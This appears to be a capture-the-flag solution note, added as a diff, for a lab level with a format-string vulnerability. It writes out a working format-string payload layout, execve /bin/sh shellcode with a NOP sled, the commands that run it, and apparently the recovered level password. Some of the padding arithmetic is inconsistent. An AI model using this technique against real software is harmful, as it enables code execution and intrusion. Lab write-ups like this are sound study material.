@@ -1,0 +1,27 @@
+solution level05:
+
+-> the program simply fills a buffer of 100 bytes from stdin with fgets
+
+-> then for each uppercase character in the buffer, the program transforms it to lowercase
+
+-> finally printf is called with the buffer as parameter then a call to exit is made
+
+-> by looking at the exit method, we see that a jump is made to the instruction located at address 0x080497e0
+
+=> with printf, we can overwrite the instruction with the address of a shellcode placed in an environment variable
+=> we export the shellcode in an environment variable and get its address with gdb : 0xffffd840
+=> there is a NOP-sled of 100 NOPs with the shellcode so we will add 50 bytes : 0xffffd872
+=> we use the %n modifier to write this address, so that the call to exit calls our shellcode instead
+=> our buffer :
+	* 0x080497e0 (4 bytes)
+	* 0x080497e2 (4 bytes)
+	* %55402x (0xd840 - 8)
+	* %10$n (the first address)
+	* %10125x (0xffff - 0xd840 = 65535 - 55410)
+	* %11$n (the second address)
+
+> scp -P 2222 Ressources/run.sh level05@127.0.0.1:/tmp
+> bash /tmp/run.sh
+> export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'`
+> cat /tmp/level05 - | ./level05
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
